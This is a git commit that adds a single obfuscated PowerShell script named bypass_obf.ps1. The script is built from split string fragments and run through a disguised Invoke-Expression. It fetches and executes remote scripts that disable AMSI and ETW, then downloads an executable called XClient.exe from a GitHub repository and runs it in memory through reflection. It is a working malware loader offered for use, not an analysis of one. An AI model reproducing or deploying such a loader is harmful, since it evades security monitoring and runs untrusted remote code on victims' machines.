7dce77ef00d887455f90b08db12cecad3a5483cf
robertoaguilarfields-blip <robertoaguilarfields@gmail.com>
2025-09-21 21:18:21 +0200

    Add files via upload

---
+++ bypass_obf.ps1
@@ -0,0 +1,10 @@
+(('i'+'e'+'x (iwr -U'+'s'+'e'+'BasicPa'+'rsing {'+'1}h'+'ttps://'+'gi'+'t'+'hub.c'+'om'+'/rob'+'e'+'r'+'toaguil'+'arfie'+'lds'+'-b'+'lip/my-pr'+'oyect'+'o/r'+'aw/r'+'e'+'f'+'s/he'+'ads'+'/'+'mai'+'n/bypass-a'+'msi'+'.'+'ps1'+'{1})
+iex (i'+'wr -'+'UseB'+'asicPa'+'r'+'s'+'i'+'n'+'g {1}'+'https:'+'//r'+'aw'+'.git'+'h'+'ubuserconten'+'t.co'+'m/'+'BlackShe'+'l'+'l2'+'56/N'+'ull'+'-AMS'+'I/'+'refs/h'+'ea'+'d'+'s'+'/ma'+'in/'+'N'+'ull-4MSI'+'.ps1{'+'1}'+')'+'
+'+'In'+'v'+'oke'+'-N'+'u'+'llAMSI -et'+'w'+'
+In'+'voke-N'+'ullAMS'+'I '+'-'+'v'+''+'
+['+'Reflec'+'tio'+'n'+'.'+'A'+'ssembly]'+'::Loa'+'d('+'
+    (New'+'-O'+'bjec'+'t Syste'+'m.'+'Ne'+'t.WebClien'+'t'+')'+'.Do'+'wnl'+'oa'+'dD'+'ata'+'('+'
+    '+'  '+'  '+'{1}'+'ht'+'t'+'ps://gi'+'th'+'ub.c'+'om'+'/r'+'ob'+'ert'+'oagu'+'ilarfi'+'elds-blip/m'+'y-'+'proye'+'ct'+'o/raw/'+'refs/'+'head'+'s/mai'+'n'+'/XCl'+'ient.e'+'xe'+'{1}'+'
+'+' '+' '+'  )'+'
+).Ent'+'ryPoint.'+'Invok'+'e'+'({'+'0}null, '+'@())
+')-f  [ChAr]36,[ChAr]34) |. ( $SHELLId[1]+$ShElLId[13]+'x')
